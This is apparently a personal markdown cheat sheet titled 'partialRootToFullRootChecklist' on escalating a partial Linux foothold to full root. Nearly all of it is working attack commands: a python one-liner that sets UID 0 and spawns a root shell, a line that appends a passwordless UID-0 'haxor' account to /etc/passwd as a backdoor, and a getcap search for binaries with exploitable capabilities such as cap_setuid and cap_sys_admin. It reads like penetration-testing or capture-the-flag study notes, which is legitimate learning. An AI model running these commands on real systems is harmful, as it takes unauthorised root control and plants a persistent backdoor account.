---
title: partialRootToFullRootChecklist
tags:
  - fetus
---
## `sudo su` (obvious no brainer)
## python: 
```sh
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
## `/etc/passwd` write root clone:
```sh
echo 'haxor::0:0::/root:/bin/bash' >> /etc/passwd
su haxor
```
## look for binaries with powerful capabilities:
```sh
getcap -r / 2>/dev/null
```
- stuff to look out for:
	- `cap_setuid`
	- `cap_setgid`
	- `cap_dac_override` (lets you rwx any file)
	- `cap_sys_admin` (a shitton of root like stuff. almost as good as full root. probably chainable to full root access)
		- make sure to check if the binary is user controllable before to save yourself some frustration: `ls -l /path/to/binary`
